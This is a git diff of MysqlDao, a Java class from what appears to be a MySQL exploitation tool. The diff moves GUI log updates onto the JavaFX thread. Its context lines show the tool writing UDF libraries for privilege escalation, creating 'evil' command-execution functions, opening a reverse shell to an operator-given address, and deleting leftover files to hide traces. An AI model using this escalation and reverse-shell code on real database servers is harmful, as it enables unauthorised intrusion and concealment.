@@ -17,6 +17,7 @@ import java.util.List;
 import java.util.Map;
 
 import Util.MysqlSqlUtil;
+import javafx.application.Platform;
 
 /**
  * @author ch1ng & j1anFen
@@ -111,12 +112,18 @@ public class MysqlDao {
             if (this.version != null && this.mysqlPlatform != null && this.systemPlatform != null) {
                 this.versionOutfile();
                 this.Option();
-                mysqlController.mysqlLogTextArea.appendText(Utils.log("本地UDF初始化成功,可尝试进行UDF提权"));
+                Platform.runLater(() -> {
+                    mysqlController.mysqlLogTextArea.appendText(Utils.log("本地UDF初始化成功,可尝试进行UDF提权"));
+                });
             } else {
-                mysqlController.mysqlLogTextArea.appendText(Utils.log("mysql版本信息获取有误"));
+                Platform.runLater(() -> {
+                    mysqlController.mysqlLogTextArea.appendText(Utils.log("mysql版本信息获取有误"));
+                });
             }
         } catch (Exception e) {
-            MessageUtil.showExceptionMessage(e, e.getMessage());
+            Platform.runLater(() -> {
+                MessageUtil.showExceptionMessage(e, e.getMessage());
+            });
         }
     }
 
@@ -143,11 +150,14 @@ public class MysqlDao {
             }
             String res = Utils.log(String.format("Mysql版本：%s 系统平台：%s 系统位数：%s", this.version, this.mysqlPlatform,
                     this.systemPlatform));
-            mysqlController.mysqlLogTextArea.appendText(res);
+            Platform.runLater(() -> {
+                mysqlController.mysqlLogTextArea.appendText(res);
+            });
             this.initUDF();
         } catch (SQLException ex) {
-            String error = ex.getMessage();
-            MessageUtil.showExceptionMessage(ex, error);
+            Platform.runLater(() -> {
+                MessageUtil.showExceptionMessage(ex, ex.getMessage());
+            });
         }
     }
 
@@ -178,7 +188,9 @@ public class MysqlDao {
                 }
             }
         } catch (Exception e) {
-            MessageUtil.showExceptionMessage(e, e.getMessage());
+            Platform.runLater(() -> {
+                MessageUtil.showExceptionMessage(e, e.getMessage());
+            });
         }
     }
 
@@ -250,17 +262,22 @@ public class MysqlDao {
 
             // 5.执行sql语句
             st.execute();
-            mysqlController.mysqlLogTextArea.appendText(Utils.log("库文件写入成功"));
+            Platform.runLater(() -> {
+                mysqlController.mysqlLogTextArea.appendText(Utils.log("库文件写入成功"));
+            });
             //PublicUtil.log("插件UDF写入成功");
 
             String sqlEval = String.format(MysqlSqlUtil.createFunctionSql,funcEvil,randomPluginFile);
             //System.out.println(sqlEval);
             PreparedStatement st1 = CONN.prepareStatement(sqlEval);
             st1.execute();
-
-            mysqlController.mysqlLogTextArea.appendText(Utils.log("函数 " + funcEvil + " 创建执行成功"));
+            Platform.runLater(() -> {
+                mysqlController.mysqlLogTextArea.appendText(Utils.log("函数 " + funcEvil + " 创建执行成功"));
+            });
         } catch (Exception e) {
-            MessageUtil.showExceptionMessage(e, e.getMessage());
+            Platform.runLater(() -> {
+                MessageUtil.showExceptionMessage(e, e.getMessage());
+            });
         }
     }
 
@@ -286,10 +303,14 @@ public class MysqlDao {
         } catch (Exception e) {
             String res = e.getMessage();
             if (res.contains("does not exist")) {
-                mysqlController.mysqlLogTextArea.appendText(Utils.log("命令函数不存在！请创建！"));
+                Platform.runLater(() -> {
+                    mysqlController.mysqlLogTextArea.appendText(Utils.log("命令函数不存在！请创建！"));
+                });
                 return "";
             }
-            MessageUtil.showExceptionMessage(e, e.getMessage());
+            Platform.runLater(() -> {
+                MessageUtil.showExceptionMessage(e, e.getMessage());
+            });
         }
         return "";
     }
@@ -310,7 +331,9 @@ public class MysqlDao {
         } catch (NullPointerException e) {
             return "命令执行完成";
         } catch (Exception e) {
-            MessageUtil.showExceptionMessage(e, e.getMessage());
+            Platform.runLater(() -> {
+                MessageUtil.showExceptionMessage(e, e.getMessage());
+            });
         }
         return "";
     }
@@ -325,14 +348,20 @@ public class MysqlDao {
             String sql = String.format(MysqlSqlUtil.ntfsCreateDirectory,remoteOutfile.substring(0, remoteOutfile.length() - 1) );
             PreparedStatement st = CONN.prepareStatement(sql);
             st.execute();
-            mysqlController.mysqlLogTextArea.appendText(Utils.log("目录创建成功"));
+            Platform.runLater(() -> {
+                mysqlController.mysqlLogTextArea.appendText(Utils.log("目录创建成功"));
+            });
         } catch (Exception e) {
             String res = e.getMessage();
             if (res.contains("already exists")) {
-                mysqlController.mysqlLogTextArea.appendText(Utils.log("目录已存在！"));
+                Platform.runLater(() -> {
+                    mysqlController.mysqlLogTextArea.appendText(Utils.log("目录已存在！"));
+                });
                 return;
             }
-            MessageUtil.showExceptionMessage(e, e.getMessage());
+            Platform.runLater(() -> {
+                MessageUtil.showExceptionMessage(e, e.getMessage());
+            });
         }
     }
 
@@ -349,7 +378,9 @@ public class MysqlDao {
             this.udf("backshell");
             backShell(reverseAddress, Integer.parseInt(reversePort), code);
         } catch (Exception e) {
-            MessageUtil.showExceptionMessage(e, e.getMessage());
+            Platform.runLater(() -> {
+                MessageUtil.showExceptionMessage(e, e.getMessage());
+            });
         }
     }
 
@@ -363,8 +394,9 @@ public class MysqlDao {
             PreparedStatement st2 = CONN.prepareStatement(cleanSql1);
             st2.execute();
         } catch (Exception e) {
-            MessageUtil.showExceptionMessage(e, e.getMessage());
-        }
+            Platform.runLater(() -> {
+                MessageUtil.showExceptionMessage(e, e.getMessage());
+            });        }
     }
 
     /**
@@ -376,7 +408,9 @@ public class MysqlDao {
         String rmplugin = null;
 
         try {
-            mysqlController.mysqlLogTextArea.appendText(Utils.log("删除服务器UDF遗留文件"));
+            Platform.runLater(() -> {
+                mysqlController.mysqlLogTextArea.appendText(Utils.log("删除服务器UDF遗留文件"));
+            });
             String tempPath = remoteOutfile + "*.temp";
             if (mysqlPlatform.startsWith("Win")) {
                 rmplugin = "del /f " + tempPath;
@@ -384,37 +418,17 @@ public class MysqlDao {
                 rmplugin = "rm -f " + tempPath;
             }
             eval(rmplugin, "UTF-8");
-            mysqlController.mysqlLogTextArea.appendText(Utils.log("卸载所有恶意函数"));
+            Platform.runLater(() -> {
+                mysqlController.mysqlLogTextArea.appendText(Utils.log("卸载所有恶意函数"));
+            });
             // 删除恶意函数
             this.removeEvilFunc();
 
-//            if(tempFiles.size() > 0) {
-//                Iterator<String> it = tempFiles.iterator();
-//                while (it.hasNext()) {
-//                    String tempFile = it.next();
-//                    String tempPath = remoteOutfile + tempFile;
-//                    if (mysqlPlatform.startsWith("Win")) {
-//                        rmplugin = "del /f " + tempPath;
-//                    } else {
-//                        rmplugin = "rm -f " + tempPath;
-//                    }
-//                    String aa = eval(rmplugin, "UTF-8");
-//                    System.out.println(aa);
-//                }
-//
-//                // 重新初始化
-//                tempFiles = new ArrayList<String>();
         } catch (Exception e) {
-            MessageUtil.showExceptionMessage(e, e.getMessage());
+            Platform.runLater(() -> {
+                MessageUtil.showExceptionMessage(e, e.getMessage());
+            });
         }
     }
-//    public static void main(String[] args) {
-//        try {
-//            MysqlDao md = new MysqlDao("192.168.18.159","3306","mysql","root","root");
-//            System.out.println(testConnection());
-//            System.out.println("success");
-//        } catch (Exception e) {
-//            e.printStackTrace();
-//        }
-//    }
+
 }
